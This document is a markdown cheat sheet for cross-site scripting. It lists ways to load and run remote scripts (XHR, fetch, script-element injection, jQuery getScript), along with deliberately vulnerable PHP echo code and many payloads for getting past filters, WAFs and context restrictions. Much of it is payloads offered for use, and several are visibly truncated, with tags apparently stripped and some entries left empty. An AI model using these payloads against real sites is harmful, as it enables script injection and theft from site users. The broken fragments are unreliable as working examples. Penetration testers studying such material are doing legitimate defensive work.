# Calling Remote Scripts with Event Handlers

This section provides various methods to call remote scripts and handle events. Each method is demonstrated with a code snippet.

### 1. XHR (XMLHttpRequest)
```javascript
var x = new XMLHttpRequest();
x.open('GET', '//0');
x.send();
x.onreadystatechange = function() {
    if (this.readyState == 4) {
        write(x.responseText);
    }
};
```

### 2. Fetch API
```javascript
fetch('//0')
    .then(function(r) {
        r.text().then(function(w) {
            write(w);
        });
    });
```

### 3. Create Element
```javascript
with(top) {
    body.appendChild(createElement('script')).src = '//0';
}
```

### 4. jQuery `$.get`
```javascript
$.get('//0', function(r) {
    write(r);
});
```

### 5. jQuery `$.getScript`
```javascript
$.getScript('//0');
```

## Bypassing XSS Mitigations

### Example PHP Code
```php
echo $_GET["p"];
echo str_replace(" ", "", $_GET["q"]);
echo $_GET["p"];
```

### Bypassing JavaScript Overrides
- **Example Payload:**
  ```
  http://javascript:alert(1)@brutelogic.com.br/webgun/test.php?p=
  ```

## The Shortest Reflected XSS Attack Possible

### Transcending Context-Based Filters

#### 1. Among Tags
- **Filter:**
  ```php
  preg_replace("/\/i", "-", $_REQUEST['q']);
  ```
- **Payload:**
  ```
  " href=javascript:alert(1)
  ```

#### 2. Inside a Tag
- **Filter:**
  ```php
  htmlspecialchars($_REQUEST['q'], ENT_QUOTES);
  ```
- **Payload:**
  ```
  text2 # text3
  ```

#### 3. In a Script Section
- **Payload:**
  ```
  protocol://domain/path/page?p= text1  text2 # text3
  ```

### Location-Based Payloads

#### Part III
- **Location Itself+After+Hash (tagName+innerHTML+location.hash):**
  ```html
  :/*click me!#*/alert(9)
  :'click me!#'-alert(9)
  ```

- **Location Itself+Hash (tagName+URL):**
  ```html
  click me!#%0Aalert(1)
  javascript: + http://domain/page?p=click me!#%0Aalert(1)
  click me!#'-alert(1)
  javascript:"-' + http://domain/page?p=click me!#'-alert(1)
  ```

- **Location After+Hash (innerHTML+URL):**
  ```html
  javascript:"-'click me!#'-alert(1)
  javascript:"-'click me! + http://domain/page?p=javascript:"-'click me!#'-alert(1)
  javascript:#%0Aalert(1)
  javascript: + http://domain/page?p=javascript:#%0Aalert(1)
  ```

- **Location Itself+After+Hash (tagName+innerHTML+URL):**
  ```html
  cript:"-'click me!#'-alert(1)
  javas + cript:"-'click me! + http://domain/page?p=cript:"-'click me!#'-alert(1)
  cript:#%0Aalert(1)
  javas + cript: + http://domain/page?p=cript:#%0Aalert(1)
  ```

- **Location Itself+Before (tagName+previousSibling):**
  ```html
  "-alert(1)click me!
  javascript:" + "-alert(1)
  ```

- **Location Itself+After+Before (tagName+innerHTML+previousSibling):**
  ```html
  "-alert(1)cript:"click me!
  javas + cript:" + "-alert(1)
  ```

- **Location After+Itself (innerHTML+outerHTML):**
  ```html
  javascript:1/*click me!*/
  javascript:1/*click me!*/ + 
  javascript:/*click me!
  javascript:/* + 
  ```

- **Location After+Before+Itself (innerHTML+previousSibling+outerHTML):**
  ```html
  */"javascript:/*click me!
  javascript:/*click me! + */" + 
  */"javascript:/*click me!
  javascript:/*click me! + */" + 
  ```

- **Location After (innerHTML):**
  ```html
  javascript%26colon;alert(1)//
  javascript:alert(1)//
  ```

- **Location Inside (name+id):**
  ```html
  javascrip + t:alert(1)
  ```

#### Part II
- **Payload:**
  ```html
  click me!#:alert(1)
  click me!#alert(1)
  /*click me!#*/alert(1)
  'click me!#'-alert(1)
  ```

- **Result:**
  ```html
  Result => javascript: + /*click me! + #*/alert(1)
  Result => javascript: +'click me! + #'-alert(1)
  ```

#### Part I
- **Payload:**
  ```html
  #javascript:alert(1)
  #(1)
  #()
  ```

- **Result:**
  ```html
  Result => javascript:alert(1)
  Result => javas + cript: + ale + rt + (1)
  Result => javas + script: + ale + rt + (1)
  Result => javas + cript: + ale + rt + ( + 1 + )
  ```

## Filter Bypass Procedure

### XSS vs WAF
- **Use Case:**
  - **Pass:**
    - `oncut, onblur, oncopy, ondrag, ondrop, onhelp, onload, onplay, onshow`
  - **Block:**

### Encoding
- **Example:**
  ```html
  " onxxx=1 (mimics a text outside of the tag)
  %22OnXxx%3D1
  ```

### Existing Code Reuse
- **Example:**
  ```html
  alert(1)//">
  http://brutelogic.com.br/webgun/test.php?p=AAAA
  ```

### XSS Payload Scheme
- **Example:**
  ```html
  click me!
  extra1  extra3
  AAAAAAAAA
  ```

This document provides a comprehensive overview of different methods to call remote scripts, bypass XSS mitigations, and create location-based payloads for testing and security purposes.